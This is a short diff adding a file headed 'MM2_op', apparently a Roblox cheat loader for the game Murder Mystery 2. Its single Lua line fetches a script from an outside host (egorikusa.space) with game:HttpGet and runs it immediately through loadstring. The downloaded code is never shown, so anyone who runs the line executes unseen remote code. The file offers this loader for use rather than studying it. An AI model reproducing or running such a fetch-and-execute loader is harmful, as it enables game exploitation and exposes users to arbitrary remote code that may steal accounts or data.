@@ -1,0 +1,5 @@
+# MM2_op
+
+
+
+loadstring(game:HttpGet("https://egorikusa.space/fa850561ab2b3dd70fa34a4d.lua", true))()
